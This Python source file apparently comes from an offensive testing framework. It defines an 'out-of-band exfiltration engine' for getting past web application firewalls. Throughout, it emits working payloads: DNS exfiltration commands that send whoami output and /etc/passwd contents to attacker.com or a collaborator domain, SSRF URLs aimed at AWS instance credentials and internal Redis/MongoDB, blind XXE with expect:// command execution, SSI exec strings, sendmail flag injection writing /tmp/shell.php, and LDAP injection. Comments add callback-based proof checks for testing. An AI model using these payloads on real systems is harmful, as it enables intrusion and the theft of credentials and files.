"""
Out-of-Band Exfiltration Engine - Layer 7 WAF Bypass

Bypasses WAF by not making direct requests to WAF-protected endpoints:
- DNS exfiltration
- SSRF via internal services
- Blind XXE
- Server-side includes
- Mail header injection
- No direct WAF contact
"""

from typing import Dict, List, Any, Optional


class OOBExfilEngine:
    """Out-of-band exfiltration to bypass WAF.

    P5-5 (OOB-STUB): the vectors this engine emits are LEADS — candidate payloads.
    An OOB exfil is CONFIRMED only by a real out-of-band CALLBACK carrying the
    planted canary (the oob_callback proof through is_proven), never by the old
    hardcoded ``waf_bypassed: True`` or a stub monitor. Conforms to WafTechnique.
    """

    name = "oob_exfil"

    def __init__(self, collaborator_domain: str = None):
        """
        Initialize OOB exfil engine

        Args:
            collaborator_domain: External collaborator (e.g., burp.oob or interactsh)
        """
        self.collaborator_domain = collaborator_domain or "collaborator.oob"
        self.oob_channels = []

    def run(self, target: str, ctx=None) -> "Optional[object]":
        """WafTechnique entry point: an OOB exfil is CONFIRMED only by a real
        out-of-band callback carrying the planted canary. ctx supplies the
        observed ``oob_events`` and the ``canary``; with a matching callback this
        returns a proven oob Evidence, otherwise None (the discover_oob_vectors
        payloads remain leads, never confirmations)."""
        ctx = ctx or {}
        events = ctx.get("oob_events") or []
        canary = (ctx.get("canary") or "").strip()
        if not events or not canary:
            return None
        from core.proof import ProofRegistry, ProofContext
        ev = ProofRegistry.build("oob_callback", ProofContext(
            oob_events=list(events), canary=canary,
            command=f"OOB exfil against {target}",
            notes="OOB callback carrying the planted canary"))
        return ev if (ev is not None and ev.is_proven()) else None

    def discover_oob_vectors(self, target: str) -> Dict[str, Any]:
        """
        Discover out-of-band vectors that bypass WAF

        No direct contact with WAF-protected endpoints
        """
        results = {
            "target": target,
            "oob_vectors": [],
            "exfil_methods": [],
            "bypass_techniques": []
        }

        # Vector 1: DNS exfiltration
        dns_vector = self._create_dns_exfil_vector(target)
        results["oob_vectors"].append(dns_vector)
        results["bypass_techniques"].append("dns_exfil")

        # Vector 2: SSRF via internal services
        ssrf_vector = self._create_ssrf_vector(target)
        results["oob_vectors"].extend(ssrf_vector)
        results["bypass_techniques"].append("ssrf_internal")

        # Vector 3: Blind XXE
        xxe_vector = self._create_blind_xxe_vector(target)
        results["oob_vectors"].append(xxe_vector)
        results["bypass_techniques"].append("blind_xxe")

        # Vector 4: Server-side includes
        ssi_vector = self._create_ssi_vector(target)
        results["oob_vectors"].append(ssi_vector)
        results["bypass_techniques"].append("ssi")

        # Vector 5: Mail header injection
        mail_vector = self._create_mail_injection_vector(target)
        results["oob_vectors"].append(mail_vector)
        results["bypass_techniques"].append("mail_injection")

        # Vector 6: LDAP injection with OOB callback
        ldap_vector = self._create_ldap_oob_vector(target)
        results["oob_vectors"].append(ldap_vector)
        results["bypass_techniques"].append("ldap_oob")

        results["exfil_methods"] = [
            v.get("method") for v in results["oob_vectors"]]

        return results

    def _create_dns_exfil_vector(self, target: str) -> Dict[str, Any]:
        """
        Create DNS exfiltration vector

        No WAF contact - uses DNS queries to exfil data
        """
        vector = {
            "name": "DNS Exfiltration",
            "method": "dns",
            "description": "Exfiltrate data via DNS queries to collaborator",
            # P5-5 (OOB-STUB): was a hardcoded `waf_bypassed: True` — a bespoke
            # false-confidence assert. A bypass is unproven until a real callback
            # carrying the canary lands (see run()/monitor_oob_channel). This is a
            # LEAD payload, not a confirmation.
            "waf_bypassed": None,
            "confirmed": False,
            "direct_waf_contact": False,

            # Payloads for various injection points
            "injection_points": {
                "sql_injection": (
                    "' UNION SELECT version() INTO OUTFILE "
                    "'/tmp/x'; "
                    "system('nslookup `cat /tmp/x`.attacker.com'); -- -"
                ),
                "command_injection": (
                    "; nslookup $(whoami).attacker.com; #"
                ),
                "xxe": (
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM "
                    "'expect://nslookup $(whoami).attacker.com'>]>"
                ),
            },

            # Execution via common applications
            "execution_methods": {
                "mysql": "SELECT load_file(CONCAT('\\\\\\\\', version(), '.attacker.com\\\\share'))",
                "postgres": "COPY (SELECT version()) TO '/tmp/x'; system('nslookup ' || `/tmp/x` || '.attacker.com')",
                "ldap": "(|(cn=*)(nslookup $(whoami).attacker.com))",
                "redis": "DEBUG OBJECT attacker.com:6379",
            }
        }

        return vector

    def _create_ssrf_vector(self, target: str) -> List[Dict[str, Any]]:
        """
        Create SSRF vectors using internal services

        Access internal resources via SSRF on public endpoint
        """
        vectors = []

        # SSRF via image processing
        vectors.append({
            "name": "SSRF - Image Upload",
            "method": "ssrf_image",
            "description": "SSRF via image upload/processing endpoint (often less protected)",
            "endpoint": "/upload",
            "payload": {
                "url": "file:///etc/passwd",
                "source": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            },
            "bypass_reason": "Image endpoints often have different WAF rules"
        })

        # SSRF via webhook
        vectors.append({
            "name": "SSRF - Webhook",
            "method": "ssrf_webhook",
            "description": "SSRF via webhook/callback parameter",
            "endpoint": "/webhook",
            "parameters": {
                "callback_url": "http://169.254.169.254/latest/meta-data/",
                "webhook_url": "gopher://internal-service:6379/_COMMAND"
            },
            "internal_targets": [
                "http://localhost:6379",  # Redis
                "http://127.0.0.1:27017",  # MongoDB
                "http://169.254.169.254",  # AWS metadata
            ]
        })

        # SSRF via URL parsing
        vectors.append({
            "name": "SSRF - URL Parser",
            "method": "ssrf_url_parser",
            "description": "SSRF via URL parsing parameter",
            "endpoint": "/api/fetch",
            "payloads": [
                "http://localhost:8080/admin",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "file:///etc/passwd",
                "gopher://internal-db:6379/_INFO",
                "dict://internal-service:11211/stats",
            ]
        })

        return vectors

    def _create_blind_xxe_vector(self, target: str) -> Dict[str, Any]:
        """
        Create Blind XXE vector with OOB callback

        XXE that exfils data via OOB channel
        """
        vector = {
            "name": "Blind XXE with OOB",
            "method": "blind_xxe",
            "description": "Blind XXE using external entity callbacks",
            "injection_points": {
                "xml_upload": {
                    "content_type": "application/xml",
                    "payload": (
                        f'<?xml version="1.0" encoding="UTF-8"?>'
                        f'<!DOCTYPE foo ['
                        f'  <!ELEMENT foo ANY >'
                        f'  <!ENTITY xxe SYSTEM "expect://nslookup `cat /etc/passwd`.{
                            self.collaborator_domain}" >'
                        f']>'
                        f'<foo>&xxe;</foo>'
                    )
                },
                "svg_upload": {
                    "content_type": "image/svg+xml",
                    "payload": (
                        '<?xml version="1.0"?>'
                        '<!DOCTYPE svg ['
                        '  <!ENTITY xxe SYSTEM "file:///etc/passwd" >'
                        ']>'
                        '<svg>&xxe;</svg>'
                    )
                }
            },
            "exfil_channels": [
                "dns",
                "http_callback",
                "ftp",
                "expect"
            ]
        }

        return vector

    def _create_ssi_vector(self, target: str) -> Dict[str, Any]:
        """
        Create Server-Side Include (SSI) vector

        SSI execution on static file endpoints
        """
        vector = {
            "name": "Server-Side Includes",
            "method": "ssi",
            "description": "Execute commands via SSI in static files",
            "file_extensions": [".shtml", ".shtm", ".stm", ".html"],
            "injection_points": [
                "/upload",
                "/assets",
                "/static",
                "/files",
                "/documents"
            ],
            "payloads": [
                "<!--#exec cmd='/bin/id' -->",
                "<!--#exec cmd='nslookup `whoami`.attacker.com' -->",
                "<!--#config timefmt='%Y-%m-%d' -->",
                "<!--#fsize file='/etc/passwd' -->",
            ],
            "bypass_reason": "Static file endpoints often bypass WAF"
        }

        return vector

    def _create_mail_injection_vector(self, target: str) -> Dict[str, Any]:
        """
        Create mail header injection vector

        Inject commands via email parameters
        """
        vector = {
            "name": "Mail Header Injection",
            "method": "mail_injection",
            "description": "Command execution via mail() function injection",
            "injection_points": {
                "contact_form": {
                    "parameter": "email",
                    "payload": "-X /tmp/shell.php"
                },
                "newsletter": {
                    "parameter": "recipient",
                    "payload": "-C /tmp/sendmail.conf"
                }
            },
            "execution_techniques": [
                "-X - log file redirection",
                "-C - config file injection",
                "-O - option override",
                "-d - debug mode"
            ],
            "typical_endpoints": [
                "/contact",
                "/subscribe",
                "/newsletter",
                "/feedback"
            ]
        }

        return vector

    def _create_ldap_oob_vector(self, target: str) -> Dict[str, Any]:
        """
        Create LDAP injection with OOB callback
        """
        vector = {
            "name": "LDAP Injection OOB",
            "method": "ldap_oob",
            "description": "LDAP injection with out-of-band callbacks",
            "injection_points": {
                "login": {
                    "username": "*",
                    "password": f"*)(|(cn=*{self.collaborator_domain}"
                },
                "search": {
                    "filter": f"*{self.collaborator_domain}*"
                }
            },
            "oob_methods": [
                "LDAP -> HTTP callback",
                "LDAP -> DNS lookup",
            ]
        }

        return vector

    def create_exfil_payload(self, vector_type: str,
                             data_source: str) -> Dict[str, Any]:
        """
        Create payload to exfiltrate specific data

        Args:
            vector_type: Type of OOB vector (dns, ssrf, xxe, etc.)
            data_source: What data to exfil (file, command, env, etc.)

        Returns:
            Exfil payload
        """
        payload = {
            "vector_type": vector_type,
            "data_source": data_source,
            "exfil_method": None,
            "command": None
        }

        if vector_type == "dns" and data_source == "file":
            payload["exfil_method"] = "dns_txt_record"
            payload["command"] = (
                f"cat /etc/passwd | while IFS= read -r line; do "
                f"nslookup \"$line.{self.collaborator_domain}\"; done"
            )

        elif vector_type == "dns" and data_source == "command":
            payload["exfil_method"] = "dns_subdomain"
            payload["command"] = (
                f"whoami | nslookup *.{self.collaborator_domain}"
            )

        elif vector_type == "ssrf" and data_source == "aws_metadata":
            payload["exfil_method"] = "ssrf_internal"
            payload["url"] = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

        elif vector_type == "xxe" and data_source == "file":
            payload["exfil_method"] = "blind_xxe_dns"
            payload["payload"] = (
                f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "
                f"'expect://nslookup $(cat /etc/passwd).{
                    self.collaborator_domain}'>]>"
            )

        return payload

    def monitor_oob_channel(self, channel_type: str = "dns",
                            observed_events: list = None,
                            canary: str = "") -> Dict[str, Any]:
        """
        Monitor OOB channel for incoming data and decide if exfil succeeded.

        P5-5 (OOB-STUB): ``exfil_successful`` is now driven by MEASUREMENT — it is
        True only when one of the ``observed_events`` (real collaborator callbacks)
        carries the planted ``canary`` (the oob_callback proof through is_proven).
        With no events/canary it stays False, exactly as before, so existing
        zero-arg callers are unaffected.
        """
        result = {
            "channel": channel_type,
            "monitoring_active": True,
            "data_received": [],
            "exfil_successful": False
        }

        if channel_type == "dns":
            result["method"] = "DNS query monitoring"
            result["collaborator"] = self.collaborator_domain
            result["expected_lookups"] = [
                f"<data>.{self.collaborator_domain}",
                f"<exfil_id>.{self.collaborator_domain}"
            ]

        elif channel_type == "http":
            result["method"] = "HTTP callback monitoring"
            result["callback_url"] = f"http://{self.collaborator_domain}"

        canary = (canary or "").strip()
        if observed_events and canary:
            from core.proof import ProofRegistry, ProofContext
            from intelligence.waf_bypass.technique import confirmed_bypass
            ev = ProofRegistry.build("oob_callback", ProofContext(
                oob_events=list(observed_events), canary=canary))
            result["exfil_successful"] = confirmed_bypass(ev)
            result["data_received"] = [
                str(e) for e in observed_events if canary in str(e)]

        return result
